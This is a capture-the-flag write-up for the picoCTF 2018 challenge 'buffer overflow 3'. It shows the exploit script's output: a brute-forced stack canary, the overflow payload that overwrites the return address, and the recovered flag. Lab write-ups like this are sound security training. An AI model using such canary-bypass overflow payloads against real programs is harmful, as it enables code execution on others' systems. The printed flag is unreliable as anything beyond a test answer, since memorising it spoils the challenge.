# buffer overflow 3 - Points: 450 - (Solves: 123)

It looks like Dr. Xernon added a stack canary to this [program][1] to
protect against buffer overflows.
Do you think you can bypass the protection and get the flag?
You can find it in /problems/buffer-overflow-3_1_2e6726e5326a80f8f5a9c350284e6c7f.
[Source][2].

[1]: https://2018shell2.picoctf.com/static/2d5da78bcb5e281180e5aa6d21852b58/vuln
[2]: https://2018shell2.picoctf.com/static/2d5da78bcb5e281180e5aa6d21852b58/vuln.c

## Hints

Maybe there's a smart way to brute-force the canary?

---

```sh
% python xpwn.py
[*] '/problems/buffer-overflow-3_1_2e6726e5326a80f8f5a9c350284e6c7f/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Const canary: 0x2c567834
[+] Starting local process '/problems/buffer-overflow-3_1_2e6726e5326a80f8f5a9c350284e6c7f/vuln': pid 2965183
[*] payload       : 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4xV,AAAAAAAAAAAAAAAA\xeb\x86\x04\x08'
[*] Process '/problems/buffer-overflow-3_1_2e6726e5326a80f8f5a9c350284e6c7f/vuln' stopped with exit code -11 (SIGSEGV) (pid 2965183)
Input> Ok... Now Where's the Flag?
picoCTF{eT_tU_bRuT3_F0Rc3_4214775b}
```
